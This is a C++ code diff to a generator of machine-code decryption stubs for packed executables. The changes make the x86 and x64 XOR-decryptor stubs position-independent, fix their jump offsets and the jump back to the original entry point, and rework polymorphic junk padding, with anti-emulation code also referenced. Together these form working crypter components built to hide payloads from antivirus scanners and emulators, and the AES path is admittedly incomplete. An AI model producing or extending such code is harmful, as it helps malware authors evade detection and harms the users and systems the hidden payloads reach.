@@ -70,7 +70,7 @@ std::vector<uint8_t> DecryptorGenerator::GenerateMovRegImm(X86Register reg,
 }
 
 std::vector<uint8_t> DecryptorGenerator::GenerateXORDecryptor(
-    const std::vector<uint8_t>& key, uint32_t rva, uint32_t size) {
+    const std::vector<uint8_t>& key, uint32_t rva, uint32_t size, uint32_t originalEntryPoint, uint32_t stubRva) {
     
     std::vector<uint8_t> code;
     
@@ -102,22 +102,44 @@ std::vector<uint8_t> DecryptorGenerator::GenerateXORDecryptor(
         code.push_back(0x60);  // PUSHAD
     }
     
-    // Initialize data pointer (encrypted section RVA)
-    auto movData = GenerateMovRegImm(dataReg, rva);
-    code.insert(code.end(), movData.begin(), movData.end());
-    
-    // Add image base to get VA
-    // MOV EAX, [some register with image base]
-    // ADD dataReg, EAX
+    // Initialize data pointer and key pointer (position-independent)
+    if (m_is64Bit) {
+        // x64 RIP-relative LEA to load absolute virtual addresses
+        uint32_t currRva = stubRva + code.size();
+        int32_t dataDisp = static_cast<int32_t>(rva) - static_cast<int32_t>(currRva + 7);
+        auto movData = GenerateLeaRip(dataReg, dataDisp);
+        code.insert(code.end(), movData.begin(), movData.end());
+        
+        currRva = stubRva + code.size();
+        int32_t keyDisp = static_cast<int32_t>(stubRva + 0x100) - static_cast<int32_t>(currRva + 7);
+        auto movKey = GenerateLeaRip(keyReg, keyDisp);
+        code.insert(code.end(), movKey.begin(), movKey.end());
+    } else {
+        // x86 GetPC technique to load position-independent pointers
+        // CALL $+5
+        code.push_back(0xE8); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
+        // POP dataReg
+        code.push_back(0x58 + static_cast<uint8_t>(dataReg));
+        
+        // MOV keyReg, dataReg
+        code.push_back(0x89);
+        code.push_back(0xC0 | (static_cast<uint8_t>(dataReg) << 3) | static_cast<uint8_t>(keyReg));
+        
+        // ADD dataReg, (rva - POP address)
+        uint32_t popRva = stubRva + static_cast<uint32_t>(code.size()) - 1;
+        int32_t dataOffset = static_cast<int32_t>(rva) - static_cast<int32_t>(popRva);
+        auto addData = GenerateAddRegImm(dataReg, dataOffset);
+        code.insert(code.end(), addData.begin(), addData.end());
+        
+        // ADD keyReg, ((stubRva + 0x100) - POP address)
+        int32_t keyOffset = static_cast<int32_t>(stubRva + 0x100) - static_cast<int32_t>(popRva);
+        auto addKey = GenerateAddRegImm(keyReg, keyOffset);
+        code.insert(code.end(), addKey.begin(), addKey.end());
+    }
     
     // Initialize size counter
     auto movSize = GenerateMovRegImm(sizeReg, size);
     code.insert(code.end(), movSize.begin(), movSize.end());
-    
-    // Initialize key pointer (key will be embedded)
-    uint32_t keyRva = rva + size + 0x100;  // After encrypted data
-    auto movKey = GenerateMovRegImm(keyReg, keyRva);
-    code.insert(code.end(), movKey.begin(), movKey.end());
     
     // Initialize key length
     auto movKeyLen = GenerateMovRegImm(keyLenReg, 
@@ -143,8 +165,6 @@ std::vector<uint8_t> DecryptorGenerator::GenerateXORDecryptor(
     code.insert(code.end(), addKey.begin(), addKey.end());
     
     // Decrement key length counter
-    auto xorKeyLen = GenerateXorRegReg(keyLenReg, keyLenReg);
-    // Actually DEC keyLenReg
     if (m_is64Bit) {
         code.push_back(0xFF);
         code.push_back(0xC8 + static_cast<uint8_t>(keyLenReg));
@@ -153,17 +173,36 @@ std::vector<uint8_t> DecryptorGenerator::GenerateXORDecryptor(
     }
     
     // Check if key exhausted
-    code.push_back(0x75);  // JNZ
-    code.push_back(0x05);  // Skip next instructions
+    uint32_t jnzOffset = static_cast<uint32_t>(code.size());
+    code.push_back(0x75); // JNZ
+    code.push_back(0x00); // placeholder for displacement
     
-    // Reset key pointer
-    auto resetKey = GenerateMovRegImm(keyReg, keyRva);
-    code.insert(code.end(), resetKey.begin(), resetKey.end());
+    uint32_t resetStart = static_cast<uint32_t>(code.size());
+    
+    // Reset key pointer and key length
+    if (m_is64Bit) {
+        uint32_t currRva = stubRva + code.size();
+        int32_t resetKeyDisp = static_cast<int32_t>(stubRva + 0x100) - static_cast<int32_t>(currRva + 7);
+        auto resetKey = GenerateLeaRip(keyReg, resetKeyDisp);
+        code.insert(code.end(), resetKey.begin(), resetKey.end());
+    } else {
+        // CALL $+5
+        code.push_back(0xE8); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
+        // POP keyReg
+        code.push_back(0x58 + static_cast<uint8_t>(keyReg));
+        uint32_t popRva = stubRva + static_cast<uint32_t>(code.size()) - 1;
+        int32_t keyOffset = static_cast<int32_t>(stubRva + 0x100) - static_cast<int32_t>(popRva);
+        auto addKeyReset = GenerateAddRegImm(keyReg, keyOffset);
+        code.insert(code.end(), addKeyReset.begin(), addKeyReset.end());
+    }
     
     // Reset key length
     auto resetKeyLen = GenerateMovRegImm(keyLenReg, 
         static_cast<uint32_t>(key.size()));
     code.insert(code.end(), resetKeyLen.begin(), resetKeyLen.end());
+    
+    uint32_t resetEnd = static_cast<uint32_t>(code.size());
+    code[jnzOffset + 1] = static_cast<uint8_t>(resetEnd - resetStart);
     
     // Decrement size counter
     if (m_is64Bit) {
@@ -173,10 +212,14 @@ std::vector<uint8_t> DecryptorGenerator::GenerateXORDecryptor(
         code.push_back(0x48 + static_cast<uint8_t>(sizeReg));
     }
     
-    // Jump if not zero
-    code.push_back(0x75);  // JNZ
-    int8_t offset = static_cast<int8_t>(loopStart - code.size() - 1);
-    code.push_back(static_cast<uint8_t>(offset));
+    // Jump if not zero (back to loopStart).
+    // JNZ is 2 bytes; displacement is relative to the next instruction.
+    // After push(0x75), code.size() includes the opcode byte.
+    // After push(displacement), IP moves to code.size()+1.
+    // We want: (loopStart) = (code.size() + 1) + offset => offset = loopStart - code.size() - 1
+    code.push_back(0x75);  // JNZ rel8 opcode
+    int8_t loopOffset = static_cast<int8_t>(static_cast<int32_t>(loopStart) - static_cast<int32_t>(code.size()) - 1);
+    code.push_back(static_cast<uint8_t>(loopOffset));
     
     // Restore registers
     if (m_is64Bit) {
@@ -189,7 +232,20 @@ std::vector<uint8_t> DecryptorGenerator::GenerateXORDecryptor(
     
     // Jump to original entry point
     code.push_back(0xE9);  // JMP rel32
-    // Original EP - current position - 5
+    {
+        uint32_t currentOffset = static_cast<uint32_t>(code.size());
+        uint32_t jmpNextRva = stubRva + currentOffset + 4;
+        int32_t disp = static_cast<int32_t>(originalEntryPoint - jmpNextRva);
+        code.push_back(disp & 0xFF);
+        code.push_back((disp >> 8) & 0xFF);
+        code.push_back((disp >> 16) & 0xFF);
+        code.push_back((disp >> 24) & 0xFF);
+    }
+    
+    // Pad stub to exactly 0x100 bytes before appending the key
+    if (code.size() < 0x100) {
+        code.resize(0x100, 0x90);
+    }
     
     // Append key
     code.insert(code.end(), key.begin(), key.end());
@@ -208,23 +264,23 @@ std::vector<uint8_t> DecryptorGenerator::GenerateAddRegImm(X86Register reg,
     std::vector<uint8_t> code;
     uint8_t regEnc = static_cast<uint8_t>(reg);
     
+    if (m_is64Bit) {
+        code.push_back(0x48); // REX.W prefix for 64-bit addition
+    }
+    
     if (value <= 0x7F) {
         // ADD reg, imm8
-        code = {
-            0x83,
-            static_cast<uint8_t>(0xC0 + regEnc),
-            static_cast<uint8_t>(value)
-        };
+        code.push_back(0x83);
+        code.push_back(static_cast<uint8_t>(0xC0 + regEnc));
+        code.push_back(static_cast<uint8_t>(value));
     } else {
         // ADD reg, imm32
-        code = {
-            0x81,
-            static_cast<uint8_t>(0xC0 + regEnc),
-            static_cast<uint8_t>(value & 0xFF),
-            static_cast<uint8_t>((value >> 8) & 0xFF),
-            static_cast<uint8_t>((value >> 16) & 0xFF),
-            static_cast<uint8_t>((value >> 24) & 0xFF)
-        };
+        code.push_back(0x81);
+        code.push_back(static_cast<uint8_t>(0xC0 + regEnc));
+        code.push_back(static_cast<uint8_t>(value & 0xFF));
+        code.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
+        code.push_back(static_cast<uint8_t>((value >> 16) & 0xFF));
+        code.push_back(static_cast<uint8_t>((value >> 24) & 0xFF));
     }
     
     return code;
@@ -313,37 +369,26 @@ std::vector<uint8_t> DecryptorGenerator::GenerateAntiEmulationCode() {
 }
 
 void DecryptorGenerator::InsertPolymorphicJunk(std::vector<uint8_t>& code) {
-    // Insert random junk instructions
-    for (size_t i = 0; i < code.size(); ++i) {
-        if (m_rng.Next(100) < 10) {  // 10% chance
-            std::vector<std::vector<uint8_t>> junk;
-            if (m_is64Bit) {
-                junk = {
-                    {0x50, 0x58},  // PUSH/POP RAX
-                    {0x87, 0xC0},  // XCHG EAX, EAX
-                    {0x90},        // NOP
-                    {0x66, 0x90}   // 2-byte NOP
-                };
-            } else {
-                junk = {
-                    {0x50, 0x58},  // PUSH/POP EAX
-                    {0x87, 0xC0},  // XCHG EAX, EAX
-                    {0x40, 0x48},  // INC/DEC EAX
-                    {0x90},        // NOP
-                    {0x66, 0x90}   // 2-byte NOP
-                };
-            }
-            
-            size_t choice = m_rng.Next(static_cast<uint32_t>(junk.size()));
-            code.insert(code.begin() + i, junk[choice].begin(), junk[choice].end());
-            i += junk[choice].size();
-        }
+    // Append polymorphic NOP padding at the tail only.
+    // We CANNOT insert into the middle of existing code because all
+    // displacements and jump offsets are pre-calculated before this call.
+    static const std::vector<std::vector<uint8_t>> junkTemplates = {
+        {0x90},                       // NOP
+        {0x66, 0x90},                 // 2-byte NOP
+        {0x0F, 0x1F, 0x00},           // NOP DWORD PTR [RAX]
+        {0x0F, 0x1F, 0x40, 0x00},     // NOP DWORD PTR [RAX+0]
+        {0x87, 0xC0},                 // XCHG EAX, EAX
+    };
+    size_t numJunk = 8 + m_rng.Next(8);
+    for (size_t i = 0; i < numJunk; ++i) {
+        const auto& tmpl = junkTemplates[m_rng.Next(static_cast<uint32_t>(junkTemplates.size()))];
+        code.insert(code.end(), tmpl.begin(), tmpl.end());
     }
 }
 
 std::vector<X86Register> DecryptorGenerator::AllocateRegisters(int count) {
     std::vector<X86Register> available = {
-        X86Register::EAX, X86Register::ECX, X86Register::EDX, X86Register::EBX,
+        X86Register::ECX, X86Register::EDX, X86Register::EBX,
         X86Register::ESI, X86Register::EDI
     };
     
@@ -363,12 +408,13 @@ std::vector<uint8_t> DecryptorGenerator::Generate(
     PayloadEncryptor::Algorithm algo,
     uint32_t encryptedSectionRva,
     uint32_t encryptedSectionSize,
-    uint32_t /*originalEntryPoint*/) {
+    uint32_t originalEntryPoint,
+    uint32_t stubRva) {
     
     switch (algo) {
         case PayloadEncryptor::Algorithm::XOR:
             return GenerateXORDecryptor(key, encryptedSectionRva, 
-                encryptedSectionSize);
+                encryptedSectionSize, originalEntryPoint, stubRva);
         case PayloadEncryptor::Algorithm::RC4:
             return GenerateRC4Decryptor(key, encryptedSectionRva,
                 encryptedSectionSize);
@@ -376,8 +422,8 @@ std::vector<uint8_t> DecryptorGenerator::Generate(
             return GenerateAESDecryptor(key, encryptedSectionRva,
                 encryptedSectionSize);
         default:
-            return GenerateXORDecryptor(key, encryptedSectionRva,
-                encryptedSectionSize);
+            return GenerateXORDecryptor(key, encryptedSectionRva, 
+                encryptedSectionSize, originalEntryPoint, stubRva);
     }
 }
 
@@ -401,6 +447,23 @@ std::vector<uint8_t> DecryptorGenerator::GenerateAESDecryptor(
     // Would include AES key expansion and decryption rounds
     // Simplified for brevity
     
+    return code;
+}
+
+std::vector<uint8_t> DecryptorGenerator::GenerateLeaRip(X86Register reg, int32_t displacement) {
+    std::vector<uint8_t> code;
+    uint8_t regId = static_cast<uint8_t>(reg);
+    if (m_is64Bit) {
+        uint8_t rex = 0x48; // REX.W
+        if (regId >= 8) rex |= 0x04; // REX.R
+        code.push_back(rex);
+        code.push_back(0x8D); // LEA opcode
+        code.push_back(((regId & 0x7) << 3) | 0x05); // ModRM: mod=00, reg=regId, rm=101 (RIP)
+        code.push_back(displacement & 0xFF);
+        code.push_back((displacement >> 8) & 0xFF);
+        code.push_back((displacement >> 16) & 0xFF);
+        code.push_back((displacement >> 24) & 0xFF);
+    }
     return code;
 }
 
